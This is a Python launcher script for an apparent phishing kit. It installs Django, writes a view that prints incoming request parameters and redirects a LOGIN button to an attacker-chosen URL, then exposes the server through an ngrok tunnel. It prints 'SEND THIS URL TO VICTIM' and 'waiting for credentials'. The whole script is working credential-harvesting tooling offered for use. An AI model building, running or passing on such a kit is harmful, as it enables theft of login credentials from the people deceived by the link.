import os
import sys
from pyngrok import ngrok
from termcolor import colored
import time

banner="""   blaaaahh  """
print(banner)
def clear():
 os.system('clear')
 print(banner)

r = input("""\n\n\n
             Enter r to Run setup  >>  """)


if r == 'r':
 print("""
                   installing ...""")
else:
 print("\n\n\n            cancelled!  \n\n")+exit()



py = "/usr/bin/python3*"

if os.path.exists(os.path.dirname(py)):
 os.system("python3 -m pip install virtualenv")


if not os.path.exists(os.path.dirname(py)):
 os.system("python -m pip install virtualenv")

os.system("virtualenv env")
os.system(". env/bin/activate")

if os.path.exists(os.path.dirname(py)):
 os.system("python3 -m pip install django")

if not os.path.exists(os.path.dirname(py)):
 os.system("python -m pip install django")

os.system('clear')
clear()

url = input("""\n\n
                   enter any  Url to redirect LOGIN button \n  >> """)

fm = "app/views.py"

if os.path.exists(os.path.dirname(fm)):
  os.remove(fm)

if not os.path.exists(os.path.dirname(fm)):
 os.makedirs(os.path.dirname(fm))


rr = open(fm,"w")
rr.write('''
from django.shortcuts import render,redirect

def main(request):
 print(request.GET)
 return render(request, "app.html")

def com(request):
 return redirect("'''+url+'")')
rr.close()

time.sleep(2)

ngurl = ngrok.connect(4863)
os.system('clear')
clear()
print("""\n\n\n

               SEND THIS URL TO VICTIM

    >> :  """+ngurl+"""\n\n

     waiting for credentials ... \n\n\n""")

if os.path.exists(os.path.dirname(py)):
 os.system("python3 manage.py runserver 0.0.0.0:4863")

if not os.path.exists(os.path.dirname(py)):
 os.system("python manage.py runserver 0.0.0.0:4863")
